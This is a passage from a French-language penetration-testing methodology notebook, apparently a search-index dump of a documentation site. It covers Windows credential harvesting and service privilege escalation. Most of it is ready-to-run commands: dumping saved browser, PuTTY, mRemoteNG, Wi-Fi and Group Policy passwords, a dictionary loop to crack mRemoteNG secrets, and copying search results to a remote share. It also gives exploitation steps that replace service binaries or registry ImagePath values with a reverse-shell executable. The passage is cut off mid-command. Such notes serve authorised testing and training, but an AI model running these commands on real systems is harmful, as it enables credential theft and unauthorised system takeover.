DOS en tant que :</li> </ul> <pre><code> inlanefreight\\bob \"COMMAND HERE | REVERSE SHELL etc\"\n</code></pre> <pre><code>Get-ChildItem  'C:\\Users\\' -Directory | % { gci -Hidden \"$($_.Fullname)\\AppData\\Local\\Microsoft\\Credentials\\\" -erroraction silentlycontinue; gci -Hidden \"$($_.Fullname)\\AppData\\Roaming\\Microsoft\\Credentials\\\" -erroraction silentlycontinue }\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#google-chrome","title":"Google Chrome","text":"<p>SharpChrome peut extraire les identifiants mot de passe stock\u00e9s.</p> <pre><code>.\\SharpChrome.exe logins /unprotect\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#mremoteng","title":"mRemoteNG","text":"<p>Les fichiers de configuration sont stock\u00e9s dans \u00a0<code>%USERPROFILE%\\APPDATA\\Roaming\\mRemoteNG\\confCons.xml</code></p> <pre><code># Identification des fichiers de configuration d'mRemoteNG\n(Gci c:\\Users -Directory | Select -ExpandProperty Name | %{ gc \"C:\\Users\\$_\\APPDATA\\Roaming\\mRemoteNG\\confCons.xml\" -ErrorAction SilentlyContinue} ) -split ' ' | Select-String -List \"pass\", \"user\"\n</code></pre> <p>Les fichiers ont la forme suivante :</p> <pre><code>&lt;?XML version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;mrng:Connections xmlns:mrng=\"http://mremoteng.org\" Name=\"Connections\" Export=\"false\" EncryptionEngine=\"AES\" BlockCipherMode=\"GCM\" KdfIterations=\"1000\" FullFileEncryption=\"false\" Protected=\"QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe\" ConfVersion=\"2.6\"&gt;\n    &lt;Node Name=\"RDP_Domain\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\" Id=\"096332c1-f405-4e1e-90e0-fd2a170beeb5\" Username=\"administrator\" Domain=\"test.local\" Password=\"sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==\" Hostname=\"10.0.0.10\" Protocol=\"RDP\" PuttySession=\"Default Settings\" Port=\"3389\"\n    ..SNIP..\n&lt;/Connections&gt;\n</code></pre> <p>Les mots de passes sont stock\u00e9s sous une forme chiffr\u00e9e avec le mot de passe par d\u00e9faut <code>mR3m</code>.</p> <p>L'outil \u00a0mRemoteNG-Decrypt permet de d\u00e9crypter le mot de passe.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#dechiffrement-du-mot-de-passe","title":"D\u00e9chiffrement du mot de passe","text":"<pre><code># cl\u00e9 de chiffrement par d\u00e9faut : mR3m\npython3 mremoteng_decrypt.py -s \"s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=\"\n\n# Autre cl\u00e9\npython3 mremoteng_decrypt.py -s \"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==\" -p admin\n\n# Attaque par dictionnaire pour trouver le mot de passe \nfor password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s \"EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==\" -p $password 2&gt;/dev/null;done \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#autologon","title":"Autologon","text":"<pre><code>reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" | findstr /i \"AutoAdmin Username Password\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#putty","title":"Putty","text":"<pre><code># Liste des sessions enregistr\u00e9es\nreg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\n# Interrogation d'une session\nreg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\Server1 | findstr /i \"User Pass\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#mots-de-passe-wifi","title":"Mots de passe Wifi","text":"<pre><code># Liste des profiles\nnetsh wlan show profile\n\n# Affichage de la cl\u00e9 wifi du profile \"Profile1\"\nnetsh wlan show profile Profile1 key=clear\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#outils-ciblant-plusieures-applicatifs","title":"Outils ciblant plusieures applicatifs","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#lazagne","title":"Lazagne","text":"<p>** PENSER A RELANCER EN TANT QUE SYSTEM **</p> <p>Collecte de nombreux mots de passe stock\u00e9s dans diverses endroits du syst\u00e8me</p> <p>Liste des applicatifs support\u00e9s : https://github.com/AlessandroZ/LaZagne#supported-software</p> <p>https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe</p> <pre><code>lazagne.exe all\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#sessiongopher","title":"SessionGopher","text":"<p>D'apr\u00e8s la documentation du projet, d\u00e9crypte les mots de passes stock\u00e9s dans les configuration des applications suivantes : PuTTY, WinSCP, FileZilla, SuperPuTTY, et RDP.</p> <p>SessionGopher</p> <pre><code>Import-Module .\\SessionGopher.ps1\nInvoke-SessionGopher -Target SRV1 # si privil\u00e8ges suffisants. Sinon, on peut chercher des infos pour son propre compte utilisateur ou tout ceux du poste (si admin)\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#fichiers-interessants","title":"Fichiers Int\u00e9ressants","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#recherche-de-fichier-automatisee-snaffler","title":"Recherche de fichier automatis\u00e9e : Snaffler","text":"<p>https://github.com/SnaffCon/Snaffler/releases/download/1.0.132/Snaffler.exe</p> <pre><code> .\\snaffler.exe -s -i c:\\\n .\\snaffler.exe -o \\\\10.10.15.96\\share\\snaffler.log -i c:\\\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#recherche-de-fichiers-manuelle","title":"Recherche de fichiers manuelle","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#cmd","title":"CMD","text":"<pre><code># FINDSTR\n# /S : recherche dans les sous dossiers\n# /P : ignore les fichiers ne contenant pas de caract\u00e8res affichables\n# /I : insenssible \u00e0 la casse\n# /N : affiche le num\u00e9ro des lignes correspondant\n# /M : affiche seulement le nom du fichier (pas la ligne correspondant au texte cherch\u00e9)\n\n# recherche du terme \"password\" ou \"cred\" : liste le nom des fichiers contenant \"password\" (sans afficher le contenu trouv\u00e9)\nfindstr /SIM \"password cred\" *.xml *.yml *.ini *.txt *.config *.cfg *.git *.ps1 *.vbs *.cmd *.bat *.sh\n\n# recherche du terme \"password\" ou \"cred\" : liste le nom des fichiers et la ligne qui a match\u00e9\nfindstr /SPIN  \"password cred\" *.xml *.yml *.ini *.txt *.config *.cfg *.git *.ps1 *.cmd *.bat *.sh* # *.vbs\n\n# Recherche de diff\u00e9rents fichiers en m\u00eame temps\ndir /S /B *secret* == *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *.rdp == *.vnc == *.cred == *.kdbx *.vhd* == *.vmdk *.sh\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#powershell","title":"Powershell","text":"<pre><code># Terme int\u00e9ressants dans des fichiers\n## Nom du fichier et mot cl\u00e9 trouv\u00e9\nGet-ChildItem *.xml, *.yml, *.ini, *.txt, *.config, *.cfg, *.git, *.ps1, *.vbs, *.cmd, *.bat  -Recurse -ErrorAction SilentlyContinue | ? { $_.Path -notlike '*\\windows\\*' } | Select-String \"password\"  -ErrorAction SilentlyContinue  | Sort -Unique | Tee-Object \\\\10.10.15.96\\share\\found_word_password.txt\n# Nom du fichier seulement\nGet-ChildItem *.xml, *.yml, *.ini, *.txt, *.config, *.cfg, *.git, *.ps1, *.vbs, *.cmd, *.bat  -Recurse -ErrorAction SilentlyContinue | ? { $_.Path -notlike '*\\windows\\*' } | Select-String \"password\"  -ErrorAction SilentlyContinue | Select -ExpandProperty Path | Sort -Unique | Tee-Object \\\\10.10.15.96\\share\\found_word_password.txt\n\n\n# Fichiers avec des noms int\u00e9ressants\nGet-ChildItem  -Recurse -Include \"*secret*\", \"*pass*.txt\", \"*pass*.xml\", \"*pass*.ini\", \"*cred*\", \"*vnc*\", \"*.config\", \"*.rdp\", \"*.vnc\", \"*.cred\", \"*.kdbx\",\"*.kdb\", \"*.vhd*\", \"*.vmdk\" -ErrorAction Ignore | Select -ExpandProperty FullName\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#historiques-powershell","title":"Historiques Powershell","text":"<p>On peut v\u00e9rifier l'emplacement de l'historique via : <code>(Get-PSReadLineOption).HistorySavePath</code></p> <p>Collecte des historiques (emplacement par d\u00e9faut)</p> <pre><code>Gci c:\\Users -Directory | Select -ExpandProperty Name | %{ gc \"C:\\Users\\$_\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#dictionnaire-google-chrome","title":"Dictionnaire Google Chrome","text":"<pre><code>Gci c:\\Users -Directory | Select -ExpandProperty Name | %{ gc \"C:\\Users\\$_\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt\" -ErrorAction SilentlyContinue | Select-String password }\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#pense-bete-sticky-notes","title":"Pense b\u00eate (sticky notes)","text":"<pre><code>Gci c:\\Users -Directory | Select -ExpandProperty Name | %{ gc \"C:\\Users\\$_\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite\" -ErrorAction SilentlyContinue }\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#lecture-du-contenu","title":"Lecture du contenu","text":"<ul> <li>Copier les fichiers \u00a0<code>plum.sqlite*</code></li> <li>Lire :<ul> <li>depuis Windows :<ul> <li>graphiquement avec \u00a0DB Browser for SQLite : utiliser la requ\u00eate <code>select Text from Note;</code></li> <li>via powershell avec le module https://github.com/RamblingCookieMonster/PSSQLite</li> </ul> </li> <li>depuis Linux :<ul> <li><code>strings plum.sqlite-wal</code></li> </ul> </li> </ul> </li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#autres","title":"Autres","text":"<pre><code># Passwords in scripts in different shares :  SYSVOL, IT shares\n%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\debug\\NetSetup.log\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat\n%WINDIR%\\System32\\drivers\\etc\\hosts\nC:\\ProgramData\\Configs\\*\nC:\\Program Files\\Windows PowerShell\\*\nunattend.xml\nc:\\windows\\panther\\unattend.xml\n\nPasswords in the AD user or computer description fields\n\nKeePass databases --&gt; pull hash, crack and get loads of access.\n\nFound on user systems and shares\n\n# Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#configuration-iis","title":"Configuration IIS","text":"<p>Fichier <code>C:\\inetpub\\wwwroot\\web.config</code></p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#recherche-de-unattendxml","title":"Recherche de unattend.xml","text":"<p>Script a d\u00e9finir (voir emplacements)</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#barre-de-recherche-windows","title":"Barre de recherche Windows","text":"<p>Mots \u00e0 tenter dans la barre de recherche du menu D\u00e9marrer</p> <pre><code>Passwords\nPassphrases\nKeys\nUsername\nUser account\nCreds\nUsers\nPasskeys\nPassphrases\nconfiguration\ndbcredential\ndbpassword\npwd\nLogin\nCredentials\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#observateur-devenement","title":"Observateur d'\u00e9v\u00e8nement","text":"<p>Si on est membre du groupe <code>Event Log Readers</code>, on pourra consulter l'observateur d'\u00e9v\u00e8nements.</p> <p>Si les Event ID 4688 (Un nouveau processus a \u00e9t\u00e9 cr\u00e9\u00e9) sont audit\u00e9s, on pourra potentiellement trouver lignes de commandes incluant des nom de compte utilisateur (voir des mots de passe).</p> <pre><code>###### n\u00e9cessite d'\u00eatre membre du gruope \"Event Log Readers\"\n# Affiche toutes les lignes de commande audit\u00e9es\nwevtutil qe Security /rd:true /f:text | Select-String \"line\"\n# Affiche les lignes contenant '/user'\nwevtutil qe Security /rd:true /f:text | Select-String \"/user\"\n# avec credentials alternatifs\nwevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr \"/user\"\n</code></pre> <p>Version Powershell (N\u00e9cessite d'\u00eatre Administrateur local)</p> <pre><code>Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#email","title":"Email","text":"<p>If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as \"pass,\" \"creds,\" \"credentials,\" etc. using the tool\u00a0MailSniper.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#mots-de-passe-dans-les-strategies-de-groupe","title":"Mots de passe dans les strat\u00e9gies de groupe","text":"<pre><code># cme smb &lt;TARGET[s]&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; -M gpp_password\n\nLocal admin:\n# cme smb 10.0.5.1 -u Administrator -p P@ss123 -d . -M gpp_password\n# cme smb 10.0.5.1 -u Administrator -p P@ss123 --local-auth -M gpp_password\n\nDomain user:\n# cme smb 10.0.5.1 -u bkpadmin -p P@ss123 -d target.corp -M gpp_password\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Recherche%20de%20fichiers%20int%C3%A9ressants%20et%20credentials%20depuis%20Windows/#cookies","title":"Cookies","text":"<p>Si on trouve des cookies de session dans les profils utilisateurs, on pourra potentiellement acc\u00e9der \u00e0 des ressources web sans avoir \u00e0 s'authentifier.</p> <p>Voir [[R\u00e9utilisation de cookies de session]]</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services%20en%20%C3%A9coute/","title":"Services en \u00e9coute","text":"<p>Pour les commandes suivantes, privil\u00e9gier les services \u00e9coutant sur 127.0.0.1 car ils sont rarement s\u00e9curis\u00e9s correctement.</p> <pre><code># liste des connections en \u00e9coute avec leur PID associ\u00e9\nnetstat -ano | findstr \"LIST\"\n</code></pre> <p>Version powershell</p> <pre><code>PS C:\\&gt; Get-NetTCPConnection -State Listen | Select-Object -Property @{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}},LocalPort\n\nProcessName                           LocalPort\n-----------                           ---------\ndfsrs                                     49731\ndns                                       49694\nservices                                  49682\nlsass                                     49674\nlsass                                     49673\nlsass                                     49667\nsvchost                                   49666\nsvchost                                   49665\nwininit                                   49664\nSystem                                    47001\nMicrosoft.ActiveDirectory.WebServices      9389\nSystem                                     8000\nSystem                                     5985\nlsass                                      3269\nlsass                                      3268\nlsass                                       636\nsvchost                                     593\nlsass                                       464\nSystem                                      445\nhttpd                                       443\nlsass                                       389\nsvchost                                     135\nlsass                                        88\nhttpd                                        80\ndns                                          53\ndns                                          53\ndns                                          53\ndns                                          53\ndfsrs                                     49731\ndns                                       49694\nservices                                  49682\nlsass                                     49674\nlsass                                     49673\nlsass                                     49667\nsvchost                                   49666\nsvchost                                   49665\nwininit                                   49664\nMicrosoft.ActiveDirectory.WebServices      9389\nlsass                                      3269\nlsass                                      3268\nlsass                                       636\nsvchost                                     593\nhttpd                                       443\nlsass                                       389\nSystem                                      139\nsvchost                                     135\nhttpd                                        80\ndns                                          53\ndns                                          53\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/","title":"Services","text":"<p>D\u00e9tails de Recherche de vecteur d'escalade via des services : [[Weak Permissions]]</p> <p>Exercices d\u00e9taillant de nombreuses m\u00e9thodes de privesc : https://tryhackme.com/room/windows10privesc</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#trouver-un-service-vulnerable-automatique","title":"Trouver un service vuln\u00e9rable (automatique)","text":"<p><code>WinPeas</code> identifie tous les services vuln\u00e9rables.</p> <p>Il faut regarder les sections suivantes :</p> <pre><code># Information sur les services\n===============(Services Information)=============\n\n# Information sur les Applications (\u00e0 recouper avec les chemin d'acc\u00e8s des services)\n===========(Applications Information)================\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#permissions-de-modifier-un-service","title":"Permissions de modifier un service","text":"<p>Si on peut modifier un service, on pourra remplacer le processus lanc\u00e9 par un reverse shell.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#detection","title":"Detection","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#manuelle","title":"Manuelle","text":"<pre><code>accesschk -accepteula -quwc daclsvc\ndaclsvc\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW NT AUTHORITY\\SYSTEM\n  RW BUILTIN\\Administrators\n  RW Everyone                          &lt;====================\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#automatique","title":"Automatique","text":"<p>Dans les r\u00e9sultats de la commande <code>.\\winPEASany.exe quiet servicesinfo applicationsinfo</code> :</p> <pre><code>===============(Services Information)=============\n daclsvc(DACL Service)[\"C:\\Program Files\\DACL Service\\daclservice.exe\"] - Manual - Stopped\n    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles       &lt;=====\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#exploitation","title":"Exploitation","text":"<pre><code># Changement du path du service\nnet stop daclsvc\nsc config daclsvc binpath= \"\\\"C:\\Windows\\Temp\\reverse.exe\\\"\"\nnet start daclsvc\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#unquoted-service-path","title":"Unquoted service path","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#detection_1","title":"D\u00e9tection","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#manuelle_1","title":"Manuelle","text":"<p>Enum\u00e9r\u00e9 les services, et selectioner ceux qui ne commencent pas par des guillemets.</p> <p>Exemple avec le path : <code>C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe</code></p> <pre><code># v\u00e9rification avec icacls des diff\u00e9rent chemins exploitables\n\"C:\\Program Files\\Unquoted Path Service\\Common.exe\"\n\"C:\\Program Files\\Unquoted.exe\"\n\"C:\\Program.exe\"\n\n# tenter de cr\u00e9er un fichier :\necho \"test\" &gt; \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"\ndel \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"\n# si pas d'erreur alors c'est exploitable\n</code></pre> <p>Remarque : On doit pouvoir le faire avec <code>icacls</code> ou <code>accesschk.exe</code> mais je n'ai pas pris le temps de creuser pour obtenir une m\u00e9thode fiable.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#automatique_1","title":"Automatique","text":"<pre><code>===============(Services Information)=============\n[...]\nunquotedsvc(Unquoted Path Service)[C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe] - Manual - Stopped - \nNo quotes and Space detected\n   =================================================================================================                                &lt;=====\n[...]\n\n=========(Applications Information)=======\n[...]\nC:\\Program Files\\Unquoted Path Service(Users [AllAccess])       &lt;====\n[...]\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#exploitation_1","title":"Exploitation","text":"<pre><code>copy reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"\nnet stop unquotedsvc\nnet start unquotedsvc\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#weak-registry-permissions","title":"Weak registry permissions","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#detection_2","title":"Detection","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#manuelle_2","title":"Manuelle","text":"<pre><code># trouver un groupe dont on est membre dans la liste fournie par la commande :\naccesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#automatique_2","title":"Automatique","text":"<pre><code>==============(Services Information)===============\n[...]\n LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:\n daclsvc: WriteData/CreateFiles\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#exploitation_2","title":"Exploitation","text":"<pre><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f\nnet start regsvc\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#insecure-service-executable","title":"Insecure service Executable","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#detection_3","title":"Detection","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#manuelle_3","title":"Manuelle","text":"<pre><code>accesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#automatique_3","title":"Automatique","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#exploitation_3","title":"Exploitation","text":"<pre><code>copy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" /Y\n\naccesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\n\nnet start filepermsvc\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#trouver-un-service-vulnerable-manuel","title":"Trouver un service vuln\u00e9rable (manuel)","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#lister-les-services","title":"Lister les services","text":"<p>Lorsqu'on liste les service, on recherche en priorit\u00e9 des chemins d'acc\u00e8s atypiques qui potentiellement  seront moins bien con\u00e7us que les services natif au syst\u00e8me d'exploitation :</p> <p>Hors du dossier <code>c:\\windows</code></p> <pre><code>get-wmiobject win32_service | select name,state, startmode,pathname,StartName | ?{$_.StartName -eq \"LocalSystem\" -and $_.pathname -notlike \"c:\\Windows\\*\" }| Sort PathName |ft\n</code></pre> <pre><code>wmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n</code></pre> <p>Tous les services</p> <pre><code>get-wmiobject win32_service | select name,state, startmode,pathname,StartName | ?{$_.StartName -eq \"LocalSystem\" -and $_.pathname -notlike \"C:\\Windows\\system32\\svchost.exe *\" }| Sort PathName |ft\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#regardes-les-permissions","title":"Regardes les permissions","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#droits-de-modification-delements-dans-le-path","title":"Droits de modification d'\u00e9l\u00e9ments dans le path","text":"<p>Prenons l'exemple du service suivant :</p> <pre><code>C:\\Program Files\\Super Vendor\\Great Product\\superservice.exe\n</code></pre> <p>On cherchera si on peut cr\u00e9er les ex\u00e9cutables suivants :</p> <ul> <li><code>C:\\Program Files\\Super Vendor\\Great.exe</code></li> <li><code>C:\\Program Files\\Super.exe</code></li> <li><code>C:\\Program.exe</code></li> </ul> <p>On v\u00e9rifie donc les permission sur les dossiers parents de ces fichier potentiels :</p> <pre><code># REMARQUE : pour les dossiers, il ne faut pas ajouter de \"\\\" \u00e0 la fin !\nicacls \"C:\\Program Files\\Super Vendor\"\nicacls \"C:\\Program Files\"\nicacls \"C:\\\"\n</code></pre> <p>Exemple de permissions :</p> <pre><code># peut cr\u00e9er des Dossiers MAIS PAS des fichiers\nCREATOR OWNER:(OI)(CI)(IO)(F) \n# peut cr\u00e9er des dossiers ET des fichiers !! (exploitable)\n\nCREATOR OWNER:(I)(OI)(CI)(IO)(F)\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#unquoted-service-path_1","title":"Unquoted service path","text":"<p>Pour ce type de mauvaise configuration, on cherchera des services dont le chemin d'acc\u00e8s :</p> <ul> <li>n'est pas entour\u00e9 de \"doubles quotes\" (guillemets)</li> <li>contient des dossier contenant des espaces dans leur nom</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Services/#services-en-dehors-de-cwindowssystem32","title":"Services en dehors de c:\\windows\\system32","text":"<pre><code># d\u00e9marr\u00e9s ou non\nget-wmiobject win32_service | select name,state, startmode,pathname,StartName | ?{$_.StartName -eq \"LocalSystem\" -and $_.pathname -notlike \"c:\\Windows\\System32\\*\" }|ft\n\n\n# Rechercher des chemins d'acc\u00e8s atypiques \nget-wmiobject win32_service | select name,state, startmode,pathname,StartName |?{$_.State -like 'Running'}|Sort StartName | ft\n\n\n# Liste des services sans ceux dans c:\\windows :\nget-wmiobject win32_service | select name,state,pathname |?{$_.State -like 'Running'} |? {$_.Pathname -notmatch 